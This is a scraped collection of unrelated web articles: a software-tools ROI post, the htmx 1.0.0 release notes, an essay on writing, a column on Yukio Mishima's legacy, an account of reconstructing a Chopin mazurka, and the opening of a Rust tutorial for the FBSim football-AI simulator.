<p>It’s true: you <em>can</em> skin a potato with your bare hands and fingernails. But it’s just not very efficient. One reason why humankind has flourished over the millennia is because we have the ability to invent tools. And a potato peeler isn’t very different from a software tool like Tower: you’ll be more productive and get a better end result when using it!</p>



<p>I don’t doubt that you <em>can</em> do lots of things manually, without using a tool. But think carefully if, at least in some cases, there’s a chance that a tool could make things <em>easier</em> and <em>more productive</em>.</p>



<blockquote><p>“The free alternative is sufficient for me.”</p></blockquote>



<p>While you usually have to <em>pay</em> for a potato peeler, software tools are <em>sometimes</em> free: they might be Open Source, or a programmer’s hobby project, or they’re sponsored by a large corporation.</p>



<p>In some cases, such a free piece of software might indeed be an excellent choice (very often the case with Open Source projects). But more often than not, “free” will come with a price tag. Let’s take <strong>quality</strong> as an example: often, quality is not on par with paid alternatives. Why? Because quality costs an immense amount of time and money which both have to come from somewhere! Other examples are non-existent customer support or the lack of good documentation. All of these things, just like the overall “quality” aspect, cost time and money which are often not available in the case of free software.</p>



<blockquote><p>“My boss won’t pay for this.”</p></blockquote>



<p>Dear managers: I hope that reading this far has convinced you that it makes a ton of sense to cover expenses for software tools. If they make your employees just a tiny bit more productive – or if they make their lives a little bit easier – then covering expenses for tools should be a no-brainer. After all, <strong>our job as managers is to provide the people in our teams with everything they need to do good, productive work</strong>.</p>



<h2>A Look at Our Own “Household Spending”</h2>



<p>I started this post by admitting that I’m terribly biased: as CEO of a small software company, it’s probably no surprise that I encourage people to buy <em>our</em> software. However, I’m quite confident that I went beyond <em>our own</em> product and proved that the ROI of software tools <em>in general</em> is often very good.</p>



<p>To prove that we really “walk the walk” (and not just “talk the talk”), here’s an overview of the tools that we spend our own, hard-earned money on:</p>



<figure><img loading="lazy" width="686" height="1024" src="https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-686x1024.png" alt="" srcset="https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-686x1024.png 686w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-201x300.png 201w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools-768x1146.png 768w, https://mk0sourcelevel699i08.kinstacdn.com/wp-content/uploads/overview-software-tools.png 842w" sizes="(max-width: 686px) 100vw, 686px"><figcaption>Software Tools Overtable</figcaption></figure>



<h2>It Goes Without Saying: Spend Wisely!</h2>



<p>Of course, all of the above does NOT mean that you should just spend, spend, spend! 💵 Like in other areas of life, you shouldn’t give in to every impulse and just buy any software tool that you come across.</p>



<p>But when it comes to <em>tools for your work</em>, I encourage you to keep your eyes just as much on the “return” part as on the “investment” of the “Return on Investment” consideration. <strong>Don’t hesitate to buy software that brings value!</strong> If it helps you and your team do your jobs better – in a more productive, easier, or safer way – then investing is probably much more clever than being overly frugal.</p>

    <h2>htmx 1.0.0 Release</h2>
<p>I'm happy to announce the <a href="https://unpkg.com/browse/htmx.org@1.0.0/">1.0.0 release</a> of htmx.</p>
<p>htmx is now mature enough that I can recommend it as a general replacement for intercooler.js
projects.  I <strong>don't</strong> think there is a strong reason to port an existing intercooler project to
htmx.  I have several large intercooler apps and will not be moving them over any time soon. I can, however, recommend using htmx over intercooler for new projects.</p>
<p>htmx is a different sort of javascript library.  It is an HTML &amp; hypertext-oriented reply to the current dominance of javascript-based SPA libraries.  It is a response to Tom MacWright's question:
<a href="https://macwright.com/2020/10/28/if-not-spas.html">"If not SPAs, What?"</a>.</p>
<p>As the <a href="https://htmx.org/">homepage says</a>:</p>
<ul>
<li>Why should only <code>&lt;a&gt;</code> and <code>&lt;form&gt;</code> be able to make HTTP requests?</li>
<li>Why should only <code>click</code> &amp; <code>submit</code> events trigger them?</li>
<li>Why should only GET &amp; POST be available?</li>
<li>Why should you only be able to replace the entire screen?</li>
</ul>
<p>HTML-oriented web development was abandoned not because hypertext was a bad idea, but rather because HTML didn't have sufficient expressive power.  htmx aims to fix that &amp; allows you to implement <a href="https://htmx.org/examples/">many common modern web UI patterns</a> using the original hypertext model of the web.</p>
<h3>History &amp; Thanks</h3>
<p>htmx began life as <a href="https://intercoolerjs.org/">intercooler.js</a> back in <a href="https://github.com/bigskysoftware/intercooler-js/commit/62d3dbdb5c056ee866aba3575e148de649fc3efe">2013</a>.</p>
<p>In <a href="https://github.com/bigskysoftware/htmx/commit/e38dea64dd1065003a0e833d7b469d24e6bc2919">april</a> of this year I began work on a jQuery-indepenent &amp; improved version of intercoolerjs, renamed
to htmx.  I chose to rename the library because, in working on intercooler, I had come to appreciate that intercooler &amp; htmx were completing HTML as a hypertext rather than just some funky, idiosyncratic javascript libraries.</p>
<p>In <a href="https://github.com/bigskysoftware/htmx/releases/tag/v0.0.1">May</a> htmx reached 0.0.1.  Soon thereafter I had the good fortune of being contacted by <a href="https://twitter.com/ben_pylo">Ben Croker</a>
who was interested in htmx as a base for his new reactive library, <a href="https://putyourlightson.com/plugins/sprig">Sprig</a>.  Ben was willing to be an early adopter of htmx and pushed the library along
much faster than it would have gone otherwise.</p>
<p>I have been very lucky to the have help and feedback from many contributors in <a href="https://github.com/bigskysoftware/htmx/graphs/contributors">Github</a> and on <a href="https://htmx.org/discord">Discord</a>.  I'd like to thank, in particular, <a href="https://github.com/benpate">Ben Pate</a>, <a href="https://github.com/rschroll">Robert Schroll</a> &amp; <a href="https://github.com/jreviews">Alejandro Schmeichler</a> for contributing code as well as new ideas and discussions.</p>
<p>I would like to thank <a href="https://devmode.fm/">Devmode.fm</a> for having me on to <a href="https://devmode.fm/episodes/dynamic-html-with-htmx">talk about htmx</a> and for cleaning up all my "uhhs" and "umms".</p>
<p>Finally, I would like to thank <a href="https://github.com/jsampson">Justin Sampson</a>, who took a lot of time to explain REST &amp; HATEOAS to me and how intercooler (and now htmx) fit into that model for web development.</p>
<h3>Changes</h3>
<ul>
<li>I bumped the version number :)</li>
</ul>
<p>Enjoy!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <h2 id="i">I</h2><p>I, like many other people, have discovered that it is almost impossible to think seriously without writing. Writing clarifies and sharpens your thoughts in a way that is superior to merely articulating them in a conversation. It allows you to look at your ideas more objectively, almost as if they were from another person. You can then examine them and think about if what you have written down is really true.</p><p>However, more often than discovering that your ideas are wrong, you will discover something different: that you do not know what you think. Sure, you have some vague idea, and you believe that there is a chain of reasoning that leads to a certain conclusion. But what you will discover is that this chain of reasoning is mostly not existent. At best, it has many holes and maybe leads not where you think it does. This discovery is, of course, very unpleasant and sometimes even painful. In a sense, you have lied to yourself by thinking you have thought through this specific topic when, in reality, you have only copied the opinion of someone else.</p><p>This process requires an immense amount of honesty because nobody likes to feel stupid. Either you do not know what you think, in which case you feel stupid. Or it turns out that what you believed to be your opinion does not really make sense, is logically inconsistent, and mostly copied from someone else, in which case you feel stupid as well. However, the reward for all this exhausting work is clarity and simplicity. You now possess a chain of reasoning where you have looked as carefully as you can for holes and problems. The next step is to let others examine your reasoning—publishing.</p><h2 id="ii">II</h2><p>I am happy when others enjoy my work and when I can offer a new perspective, but for me, the criticism of my ideas is the most rewarding part of publishing. This is why I recently wrote:</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Don't write to criticize others; write to be criticized by others.</p>— Sven Schnieders (@SvenSchnieders) <a href="https://twitter.com/SvenSchnieders/status/1303074445003812864?ref_src=twsrc%5Etfw">September 7, 2020</a></blockquote>

</figure><p>If you care about being less wrong tomorrow than you are today, you have to take this extreme attitude towards criticism. It will show in your writings and in the way you express your ideas. If you want to be perceived as smart and right, you will articulate your ideas in a moderate way so that others agree with it. (This is one of the main problems I have with contemporary intellectuals who always seem to take the middle ground.) If you are searching for truth, you will articulate the most extreme and radical consequences of your ideas, precisely because others will disagree with them and tell you where your ideas are wrong.</p><p>A good example is a discussion about the distribution of intelligence (not IQ) that I often have with my dad. To crudely summarize the discussion: he believes most people are too stupid to understand complex ideas; for him, this even applies to people who do not recognize the importance of free speech (the real free speech without the “but”). On the other hand, I think that the difference between people’s minds is mostly quantitative (speed and memory) and that almost everyone can understand complex ideas if they take the time and put in the effort; for me, this even applies to, e.g., quantum mechanics.</p><p>I do not want to get into the discussion (that’s a different essay, and it is more nuanced than I portrayed it here), but note how radically different our positions are. It is because we both put forward the most extreme consequence of our theories. If he or I cared about finding a consensus and about looking correct, we could have used different examples: he could have said that people cannot understand complex systems like capitalism, and I could have said that people are capable of understanding even classical physics.</p><p>Notice that the disagreement looks way less severe using these examples. Some people might even argue that understanding how capitalism works is more difficult than understanding classical physics. It feels as if we are way closer to a compromise or to finding a common ground. But in reality, were are just further away from finding the truth because our disagreement is not as clear and obvious as it could be, which leads to worse criticism.</p><h2 id="iii">III</h2><p>This way of expressing ideas can sometimes be perceived as rude because, in contrast to most other people, you are not searching for consensus but for the truth. However, it is not a form of arrogance to express the most extreme consequences of your ideas; it is a form of intellectual honesty. In this way, your ideas are widely open to criticism, and you are therefore more likely to learn something. You are also more likely to look stupid, but that is a price you must be willing to pay.</p><h2 id="iv">IV</h2><p>The inherent fuzziness of conversations makes it difficult to notice gaps in your understanding and reasoning. This applies both to your conversation partner and to yourself.</p><p>Having a conversation with someone else about your ideas is only superior to writing about them under two conditions. First, if you have already thought about your ideas on the topic a lot and have carefully examined your chain of reasoning, which, as I have already explained, is best done in writing. And second, if the other person is smart, has thought about the topic a lot as well, and values truth over consensus. If, and only if, both of these conditions are met, a conversation can be more fruitful in sharpening your ideas than writing about them. There are other advantages to conversations with regards to creativity, thought-provoking impulses, and inspiration, but for thinking deeply about a topic, writing is superior to a conversation.</p><h2 id="v">V</h2><p>Anyone who reads books that are commonly known as <em>the classics</em> will be somewhat discouraged from publishing their writing because these people were so smart. Every idea you come up with has probably been expressed better by someone else (most likely even by Plato because, as some say, <a href="https://www.age-of-the-sage.org/philosophy/footnotes_plato.html">all of western philosophy is merely a series of footnotes to his works</a>). Put differently by Allen Farrington:</p><blockquote>“The classics are classic because those people were a lot smarter than us and we kinda wish they were still around telling the rest of us idiots what to do.”</blockquote><p>Although I whole hardheartedly agree with this sentiment and might one day decide to write up my thoughts on why I think we are “stupider” than our ancestors, it does not have to be demotivating. In fact, it is quite the opposite. Recognizing that our contemporary intellectuals are, let’s just say, “not up for the task” should be a motivation for everyone else. I think the question,</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Have the smart people always been this stupid?</p>— Heather E Heying (@HeatherEHeying) <a href="https://twitter.com/HeatherEHeying/status/1327124783365021696?ref_src=twsrc%5Etfw">November 13, 2020</a></blockquote>

</figure><p>should be answered with a resounding no. We are standing on the shoulders of giants, being mostly unworthy of the great works of the past. But it does not mean that we cannot make ourselves worthy. You (and I) may not possess the courage of Nietzsche or the wisdom of Plato, but it is our responsibility to breathe new life into their thoughts—to think them further—and since they are not around, there is no point in being discouraged.</p><h2 id="vi">VI</h2><p>Do not compare yourself to the classics; they are dead and cannot solve our problems for us. If you need confidence, compare yourself to contemporary intellectuals, and you will see that society needs all the help it can get. Remember, “<a href="https://en.wiktionary.org/wiki/in_the_land_of_the_blind,_the_one-eyed_man_is_king">in the land of the blind, the one-eyed man is king,</a>” and one thing is certain: there are very few two-eyed men left.</p><p>Every time I get disappointed in my ability to think and articulate my thoughts, which happens frequently, I look at contemporary intellectuals and remember Bukowski’s words:</p><blockquote>“I had to continue because they were so bad, not because I was so good; and I’m still not so good, but they’re still very bad.”</blockquote><h2 id="vii">VII</h2><p>This essay is my way of saying: Start writing! You will learn as much about the topic as about yourself. You will be shocked by how often you trick yourself into falsely thinking that you have understood something. You will write and think, “Oh, is this why I think that? I didn’t know that.” </p><p>The process is exciting, challenging, scary, and sometimes painful, but above all, it is worth it. And one day, you and I might be able to read the great works of the past and feel that we have honored their achievements by keeping their ideas alive, and maybe we have even managed to think some of them further.</p><p>Thank you for reading my essay.</p>

			<p>Published in <a href="https://asia.nikkei.com/Editor-s-Picks/Tea-Leaves/Yukio-Mishima-in-the-21st-century" target="_blank">Nikkei Asia 23/11/2020</a></p>
<p>Can you imagine best-selling novelist Haruki Murakami leading a coup attempt against Japanese Prime Minister Yoshihide Suga? Or Booker Prize winner Ian McEwan taking a top general hostage in a British army base and inciting a rebellion against Boris Johnson’s government? Or any of the legions of writers and artists who regularly hammered President Donald Trump on social media choosing to die for their cause?</p>
<p>Probably not, but that would be the modern equivalent of what happened on Nov. 25, 1970, when the brilliant Japanese novelist Yukio Mishima and four accomplices invaded the office of the commander of Japan’s Self-Defense Forces, called on his troops to topple the government of Prime Minister Eisaku Sato, and then committed <em>seppuku</em>, or ritual disembowelment (vulgarly known as <em>hara-kiri</em>).<a href="http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima.jpg"><img src="http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-460x612.jpg" alt="NARMishima" width="460" height="612" srcset="http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-460x612.jpg 460w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-768x1022.jpg 768w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-395x525.jpg 395w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima-436x580.jpg 436w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/NARMishima.jpg 1503w" sizes="(max-width: 460px) 100vw, 460px"></a></p>
<p>Mishima had been nominated three times for the Nobel Prize for Literature, but he was not just a writer. He was a major celebrity in Japan, the first to be described as a <em>supasuta</em> (superstar) by the media, and one of the best-known Japanese writers abroad. In the late 1960s the magazine <em>Heibon Punch</em> nominated him the “coolest male” in Japan in its “Mr. Dandy” awards, ahead of movie star Toshiro Mifune and baseball hero Shigeo Nagashima.</p>
<p>Since his shocking suicide, establishment Japan has preferred not to dwell on the “Mishima incident,” and only ultra-rightwing groups have seemed happy to mark the various anniversaries of his death. For the 50th anniversary, though, the vibe has been different. A few days ago, I managed to catch <em>Mishima: The Last Debate</em>, a documentary that uses recently discovered footage of a face-off between Mishima and hundreds of radical students during violent street protests in 1969.</p>
<p>The film was released in March, but was still screening in Tokyo’s central Shibuya district. I half-expected the audience to be dominated by elderly rightists in combat gear. I was wrong. There were women in their 20s and 30s wearing designer masks, some students, ordinary looking couples and solitary intellectual types. Although the film was advertised as a tense confrontation between violence-prone right and violence left-wing groups, the debate was mostly respectful on both sides, with Mishima’s wit drawing gales of laughter from the students and, indeed, the cinema audience.</p>
<p>Other films about Mishima have been made this century. The late Koji Wakamatsu, a radical left sympathizer once known as the “Kurosawa of pink [erotic] movies,” directed <em>11.25: The Day He Chose His Own Fate</em>&nbsp;(2012). This biopic offers a straightforward factual account of Mishima’s last months. There is also a film version of <em>Spring Snow</em>, the first and best volume in his <em>Sea of Fertility</em>&nbsp;tetralogy.</p>
<p>His books are still popular too. Mishima wrote intense, heavyweight novels conveying his philosophical ideas, but also less serious fare as entertainments for the mass market. Interestingly it is the latter that have been doing particularly well these days. A light novel called <em>Yukio Mishima’s Letter Writing Class</em>&nbsp;has consistently ranked in Amazon Japan’s Top 10 for Japanese literature. &nbsp;Another entertainment called <em>Life for Sale</em>&nbsp;was the top seller of 2016 in the Japanese literature department of Kinokuniya, Japan’s largest bookshop, with total sales topping 250,000.</p>
<p><a href="http://www.petertasker.asia/site/wp-content/uploads/2020/11/Mish2.jpg"><img src="http://www.petertasker.asia/site/wp-content/uploads/2020/11/Mish2-460x345.jpg" alt="Mishima display at Maruzen bookshop (photo: Giles Murray)" width="460" height="345" srcset="http://www.petertasker.asia/site/wp-content/uploads/2020/11/Mish2-460x345.jpg 460w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/Mish2-768x576.jpg 768w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/Mish2-700x525.jpg 700w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/Mish2-773x580.jpg 773w" sizes="(max-width: 460px) 100vw, 460px"></a> Mishima display at Maruzen bookshop (photo: Giles Murray)
</p><p>At least 30 novels and essays have been translated into English, including <em>Life for Sale</em>. There are also two more biographies. <em>Persona</em>&nbsp;is a meticulously researched doorstopper by Naoki Inose, novelist and ex-governor of Tokyo, and Hiroaki Sato. <em>Yukio Mishima</em>&nbsp;is by British author Damian Flanagan.</p>
<p>Another British Mishima enthusiast was the rock star David Bowie, who appears to have planned his own death in 2016 with Mishima-like artistic precision. Bowie painted a portrait of Mishima, which he hung on the wall of his Berlin apartment in the late 1970s. In the 1990s, he bought a bronze bust of Mishima by British sculptor Sir Eduardo Paolozzi at Sotheby’s.&nbsp; More recently, he referred to the opening of <em>Spring Snow</em>&nbsp;in his 2013 album <em>The Next Day</em>: “Then we saw Mishima’s dog / Trapped between the rocks / Blocking the waterfall.”</p>
<p>The accent on the lighter, more humorous side of Mishima may have contributed to what seems to be a subconscious reassessment within Japan. There is also the fact that some of his political stances — on validating the constitutional status of the Self-Defense Forces, on protecting Japan’s traditional culture — no longer seem extreme.</p>
<p>Another impression came to me forcefully while watching the debate between Mishima and the radical students who were occupying the Tokyo University lecture hall. The cinema audience was agog at the huge moral issues that were being argued in a way that could never happen in today’s world.</p>
<p><a href="http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR.jpg"><img src="http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR-460x339.jpg" alt="Mishima engages with student Masahiko Akuta, now a respected theatrical impresario and actor" width="460" height="339" srcset="http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR-460x339.jpg 460w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR-768x566.jpg 768w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR-700x516.jpg 700w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR-787x580.jpg 787w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR.jpg 1447w" sizes="(max-width: 460px) 100vw, 460px"></a> Mishima engages with student Masahiko Akuta, now a respected theatrical impresario and actor
</p><p>In his much-misunderstood book, <em>The End of History and the Last Man</em>,&nbsp; Francis Fukuyama uses the ideas of philosopher Friedrich Nietzsche to speculate about what kind of landscape the post-historical “last men” will inhabit, once liberal democracy has triumphed everywhere. The answer is a world devoid of great art, struggle, risk, wisdom and self-knowledge. The last men, Fukuyama posits, “will be concerned above all for personal health and safety … content to sit at home congratulating themselves on their own broadmindedness and lack of fanaticism.”</p>
<p>Mishima’s dislike of Anglo-Saxon liberal democracy came from Nietzsche. According to Flanagan, “Mishima’s bond with Nietzsche was described by Mishima’s father after his son’s death as of an intensity beyond imagination.”</p>
<p>Mishima committed <em>seppuku</em> just 25 years after the end of World War II, much too soon for him to escape being dismissed as an unbalanced reactionary throwback to the age of militarism. Fifty years on, the last man is here, placidly enjoying his lockdown thanks to Zoom, Netflix and Uber Eats, totally comfortable with the prospect of a future controlled by artificial intelligence and big data.</p>
<p>Perhaps we need a Mishima to shock us out of our complacency.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-type="text"><p>If someone had told me a decade ago that I was going to produce the first (and, so far, only) published reconstruction of Chopin's posthumous Mazurka in F Minor that includes every uncanceled measure of the composer's sketch, I would have laughed. But apparently when a performance opportunity inspires a research obsession, unexpected things can happen.</p><p>I'm no piano virtuoso, but for some years I've performed chamber music and solo programs on a church recital series. As a student I learned Fauré's B-Minor Nocturne; Scriabin's Preludes, Op. 74; and Scott Joplin's <em data-redactor-tag="em" data-verified="redactor">Magnetic Rag</em>—each of which is its respective composer's last completed composition for solo piano (and in the case of the latter two, the composer's last completed composition). Eventually I had the idea of performing an entire recital of such works, adding Schubert's Sonata in B-flat, D. 960; Schumann's <em data-redactor-tag="em" data-verified="redactor">Ghost Variations</em>; Brahms's <em data-redactor-tag="em" data-verified="redactor">Klavierstücke</em>, Op. 119; and the piece that is generally considered Chopin's last: the Mazurka in F Minor, Op. 68, No. 4.<br></p><p>Of these last completed piano works, the mazurka was the least finished. Chopin customarily composed at the piano, then notated a sketch, and lastly wrote a fair copy. But for the work published posthumously as Op. 68, No. 4, he only got as far as the sketch, a confusing one-page document that was discovered after his death in 1849.<br></p><p>Virtually all editions of the complete Chopin mazurkas include the same sixty-two-bar A–B–A version published in 1855 by former Chopin copyist Julian Fontana, based on a fair copy by cellist Auguste Franchomme, a close friend of the composer and dedicatee of his Cello Sonata. (The Henle edition exactly follows Franchomme's copy, which is more accurate in several respects than Fontana's published version.) But I was aware of a longer version from pianist Arthur Rubinstein's 1967 RCA recording of the complete Chopin mazurkas—a 1965 reconstruction by Polish pianist-musicologist Jan Ekier that adds a C section in F major. I purchased a copy of this A–B–A–C–A version and assumed I'd play it on my recital.<br></p><p>Looking up the work in Maurice Hinson's <em data-redactor-tag="em" data-verified="redactor">Guide to the Pianist's Repertoire,</em> however, I learned of a more complete 1975 reconstruction by British pianist Ronald Smith as published by Hansen House. It turned out to be out of print, but I tracked down a copy via interlibrary loan. The C section in Smith's A–B–A–C–A version is thirtytwo bars, versus sixteen in Ekier's; in his foreword, Smith specifically criticizes Ekier's version, saying that it "takes a disastrous short-cut in the F major episode."<br></p><p>Wondering whether there had been any other published reconstructions, I of course did a Google search, which led me to "Chopin's Last Style," an article by the eminent Chopin authority Jeffrey Kallberg that appeared in the Summer 1985 issue of the <em data-redactor-tag="em" data-verified="redactor">Journal of the American Musicological Society</em> and was republished with slight emendations as a chapter in his 1996 book <em data-redactor-tag="em" data-verified="redactor">Chopin at the Boundaries: Sex, History, and Musical Genre</em>. Kallberg contends that the piece's form is actually A–B–A–C–A–B–A, which struck me as the solution to one riddle in the sketch— the two different versions of the left hand of the B section's last measure (the second version is printed as an ossia passage in the Ekier and Smith editions). It seems likely that one version of that measure is intended for the first B section, the other for the second B.<br></p><p>Kallberg also provides a detailed summary of the various attempts to reconstruct the piece, which in turn led me to two other versions: an edition by Polish composer-pianist Milosz Magin, published in 1983 by Editions Concertino of Paris, and British pianist John Vallier's 1986 edition (now out of print) of a reconstruction by British musicologist Arthur Hedley, who as the first modern scholar to view the sketch in 1951 had discovered the long-missing C section. The thirty-two-bar C section in Magin's A–B–A–C–A version is structurally identical to Smith's. The form of the Hedley-Vallier version is (as Kallberg proposed) A–B– A–C–A–B–A, with the aforementioned slight variation at the end of the second B; but its final A section is oddly truncated, and the thirty-two-bar C section includes material that is clearly crossed out in the sketch.<br></p><p>In "Chopin's Last Style," Kallberg states that "numerous attempts have been made to decipher the document, none entirely successful." Playing through the four published versions, I couldn't help drawing the same conclusion; I could not see performing any of the four verbatim. So I thought I'd put together a composite version, just for my own personal use, incorporating the most convincing readings from the various editions.<br></p><p>But how does one make those decisions? My own sense of musical style, and of Chopin's style in particular, provided a general basis. Ultimately, though, I had to study the sketch itself, a facsimile of which was printed in several of the published editions.</p><p>One of the first spots I examined was a segment that Kallberg cites as having been omitted in previous reconstructions (Ekier, Magin, and Smith all fail to include it): the bass-clef passage that Chopin labeled 3ci (an abbreviation for <em data-redactor-tag="em" data-verified="redactor">trzeci</em>, Polish for "third"). Kallberg's article interprets this segment as the left hand for the transition to the second B section, and the Hedley- Vallier edition adopts that interpretation as well. I took one look at this passage in the sketch and—to my great surprise—drew a completely different conclusion.</p><p>The passage consists of a quarter note and four eighth notes, connected by an ascending slur (the only slur in the entire sketch) that continues up and to the right of the last note; the beam over the eighth notes also continues up and to the right of the last note. To me, this looked like shorthand for an ascending tonic arpeggio that continues upwards (despite the fact that the last notated pitch is a D-flat, which sounds wrong even if the passage is used as a transition to the second A; Kallberg now conjectures that Chopin intended this note to be a C). And the function of the passage seemed clear to me as well: a little extra flourish to distinguish the final iteration of A as the end of the piece. Indeed, the A section ends three different ways—first leading to B, later leading to C, and finally ending the piece—and Chopin specifically labels this ending the "third." (I find it highly unlikely that the passage represents the second A-to-B transition. My examination of all the Chopin sectional dances—the mazurkas, polonaises, and waltzes—reveals that in A–B– A–C–A–B–A rondos where the first and second B sections are in the same key, the second transition from A to B is always identical to the first.)<br></p><p>But the <em data-redactor-tag="em" data-verified="redactor">3ci </em>passage isn't the only sketch segment that is typically omitted. At the end of the C section, Chopin wrote one measure above the staff in (presumably) treble clef and one measure plus a quarter note below the staff in bass clef. Ekier, Smith, and Magin include the former but omit the latter; Hedley-Vallier includes the latter but omits the former. No previous reconstruction had included every measure of the sketch that Chopin had not crossed out. So I made up my mind that my version would be the first—and this required figuring how to incorporate both these segments at the end of the C section. Thinking more as a composer than as a musicologist, I came up with a solution that seemed to make musical sense.<br></p><p>Barely had I drawn these conclusions than I began to question how I could have solved riddles that had stumped a whole series of eminent Chopin specialists. So first I sent my reconstruction to an esteemed scholar who has dealt extensively with another composer's manuscripts. She was quite encouraging, as were the other editors and teachers I then asked to review my work. Eventually I got up the nerve to send my version to Jeffrey Kallberg himself, who responded, "You've solved a number of puzzling passages that have eluded other researchers, including myself (I'm thinking especially of your very sensible rendition of measure 95 [the end of the C section])." He also generously provided a great deal of critical feedback that led to numerous improvements in both my reconstruction and the accompanying editorial notes.<br></p><p>By this time, I realized that my version might well be of interest to other pianists and scholars, so I began submitting it for publication, and fortunately Richard Walters of Hal Leonard decided to issue it as part of that company's Schirmer Performance Editions series. It appeared in print in 2012—the year after I gave its premiere performance on my last-completed-pianoworks recital.<br></p><p>All music schools try to link performance and scholarship. But sometimes, by pure serendipity, one leads seamlessly to the other—and then back again.<br></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I took a two week vacation in early November. Somehow I decided to spend it learning a bit more about <a href="https://www.rust-lang.org/">Rust</a> and Reinforcement Learning (RL), a sub-field of AI that I haven’t explored much before. We won’t be talking about RL this post, though. That’s for a future blogpost.</p>



<p> All of that lead to me writing <a rel="noreferrer noopener" href="https://github.com/IanTayler/fbsim" target="_blank">FBSim</a><sup>1</sup>, which I struggled to describe as <em>“a game-like football simulation environment for trying out AI ideas, written in Rust</em>“. As a game-dev framework, I used <a href="https://amethyst.rs/">amethyst</a>. Rust, amethyst and FBSim are all open source.</p>



<p>The idea is the following: you write functions defining how each of your players are to behave according to their role (forward, left, right, defender and goalie)<sup>2</sup> and according to the environment, which includes information about the position of every teammate, every opponent, the ball and the net. FBSim does the rest for you.</p>



<p>In Rust terms, all you need to do in order to make your own AI for the game and see it play against other AIs is to implement the <code>Engine</code> <em>trait</em> –a trait is like a <code>protocol</code> in swift, an <code>interface</code> in Go, or an <code>Abstract Base Class</code> in python: essentially, a set of methods–, then you register your engine and change the configuration to make the players use it.</p>



<p>We’ll be implementing a simple AI for FBSim from scratch later on in the blogpost (beginners to Rust are welcome too), but first let me show you how the game looks like.</p>



<p>These are two very simple stock AIs playing each other.</p>



<figure><div>
<p><span><iframe width="1100" height="619" src="https://www.youtube.com/embed/OGKFFvp1zzA?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p>
</div><figcaption><code>BasicWingWait</code> <em>detroying </em><code>Basic</code> on a game</figcaption></figure>



<p>Exciting? <em>No? </em>Well… uhh… it’s a bit more exciting if you write the AI yourself.</p>



<p>Let’s go ahead with the implementation.</p>



<h2>Get (to) the sources</h2>



<p>First, let’s download the source code, and checkout the tag for the code that’s compatible with this blogpost.</p>



<pre><code>git clone git@github.com:IanTayler/fbsim.git
cd fbsim
git checkout blogpost-1b # APIs may change in the future!</code></pre>



<h2>Get Rust (if necessary)</h2>



<p>If you have Rust and <code>cargo</code> installed, you’re ready to go ahead. If not, then you should check out <code><a href="https://rustup.rs/">rustup</a></code>. Once you’ve installed <code>rustup</code>, and used it to install the compiler (I’m using 1.47.0) and <code>cargo</code>, you’re good to go.</p>



<p><strong>Note: </strong>FBSim uses <code>const fn</code> with a <code>match</code> statement, so you will need a relatively new version of the Rust compiler. If you’re getting errors mentioning <code>const fn</code> and <code>match</code>, then you probably need to update your compiler to a newer version.</p>



<h2>Build FBSim</h2>



<h3>Linux</h3>



<p>In order for amethyst to work, you should first install some system dependencies, as detailed <a href="https://github.com/amethyst/amethyst#dependencies">here</a>. Install the dependencies according to your distribution and then you can proceed to run the following.</p>


<pre title="">source ./env.sh # necessary due to a rendy bug with vulkan
cargo run
</pre>


<h3>MacOS</h3>



<p>If you’re under macOS, you first need to change the <code>Cargo.toml</code> to use <code>metal</code> instead of <code>vulkan</code>.</p>



<p>Your final Cargo.toml file should look like this:</p>


<pre title="">[package]
name = "fbsim"
version = "0.1.0"
authors = ["Ian Tayler &lt;iangtayler@gmail.com&gt;"]
edition = "2018"
readme = "README.md"
repository = "https://github.com/IanTayler/fbsim/"
license = "MIT"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies.amethyst]
version = "0.15.3"
features = ["metal"]

[dependencies.serde]
version = "1.0.104"

[dependencies]
rand = "0.7.0"
rand_distr = "0.3.0"
</pre>


<p>Now, you can save the file and run:</p>


<pre title="">cargo run
</pre>


<p>I didn’t test this on a mac, so these instructions are based on speculation. Let me know if it doesn’t work for you.</p>



<p><strong>Note: </strong>It was brought to my attention that some people were having <a href="https://github.com/gfx-rs/gfx/issues/2309#issuecomment-506130902">the following issue</a> mentioning <code>gfx-backend-metal</code> and <code>xcrun</code> on macOS. If that’s you, follow the linked issue to get a likely solution.</p>



<h3>Windows</h3>



<p>I think the simple <code>cargo run</code> should work by itself under windows. Let me know if that’s not the case!</p>



<h2>Checking that it works</h2>



<p>If it works, you should see something like the following screenshot. The players should be moving about. Some of them could be standing still. That’s normal.</p>

<h2>What an FBSim Engine is</h2>



<p>What we’re going to do now is to implement a new <code>Engine</code> and try it out against one of the stock ones.</p>



